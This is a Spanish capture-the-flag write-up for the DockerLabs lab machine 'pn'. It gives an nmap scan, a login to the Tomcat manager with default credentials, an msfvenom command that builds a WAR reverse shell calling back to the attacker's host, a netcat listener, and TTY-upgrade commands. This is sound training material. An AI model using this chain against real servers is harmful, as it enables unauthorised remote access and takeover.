# pn — DockerLabs.es 🐳

<img width="548" height="298" alt="1" src="https://github.com/user-attachments/assets/5000b61e-7796-499e-81eb-69b373590cec" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento
Iniciamos con un escaneo en nmap:
```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n -oN escaneo.txt 172.17.0.2
```
<img width="546" height="301" alt="2" src="https://github.com/user-attachments/assets/aec25f32-908b-4ba6-a346-7b36b551aca9" />


Y encontramos el puerto 8080 abierto la cuál está corriendo un servidor Tomcat
<img width="1169" height="522" alt="3" src="https://github.com/user-attachments/assets/4afcdc30-6f89-4b62-a746-7428d822e01e" />


## 2. Explotación

Hacemos click en “manager webapp”


<img width="466" height="383" alt="4" src="https://github.com/user-attachments/assets/692e15b8-6874-4702-8c99-823f17d8e26d" />


Y ponemos las credenciales por defecto:

usuario: `tomcat`

password: `s3cr3t`


<img width="1098" height="588" alt="5" src="https://github.com/user-attachments/assets/729d2290-ecfe-4df1-a38c-26b303bb2991" />


Y logramos obtener acceso al servidor


<img width="1323" height="579" alt="6" src="https://github.com/user-attachments/assets/3c2dce6a-a6ea-4057-8839-12970aa57590" />


Si revisamos la página podemos ver que tiene un panel de subida de archivos, por lo que podemos probar con subir una reverse shell de PentestMonkey


<img width="1187" height="170" alt="7" src="https://github.com/user-attachments/assets/8ed5fb27-a9a8-4d79-8c7f-69472777e0a6" />


Seleccionamos el archivo y le damos a “Deploy”


<img width="589" height="164" alt="8" src="https://github.com/user-attachments/assets/1c1d050c-d801-42aa-a767-e9308b60802a" />

Una vez subido nos sale un mensaje que dice que solo admiten archivos .war


<img width="645" height="141" alt="9" src="https://github.com/user-attachments/assets/264c32e2-c223-4316-8014-2ad199c824b8" />

Por lo que vamos a implementar msfvenom para la creación del código malicioso de la siguiente manera:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o virus.war
```
<img width="718" height="102" alt="10" src="https://github.com/user-attachments/assets/8c35fe4c-1fff-4703-a659-5e77b454bcd0" />

Luego subimos el archivo subido y esta vez se sube correctamente.

Primero que nada nos ponemos en escucha con netcat al puerto 443 y después le damos click al archivo subido para poder entablar una conexión reversa.


<img width="641" height="200" alt="11" src="https://github.com/user-attachments/assets/51b48b3d-0172-4a2b-a2ea-7d04c472027f" />


<img width="539" height="109" alt="12" src="https://github.com/user-attachments/assets/89a5e6ec-c8b9-47b1-83fd-395135bacc01" />

Aqui realizamos el tratamiento de la TTY:


```bash
script /dev/null -c bash
control_z

stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
```

<img width="347" height="162" alt="13" src="https://github.com/user-attachments/assets/52abdfe6-edb9-4ba2-9d86-8084d1caf541" />


**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
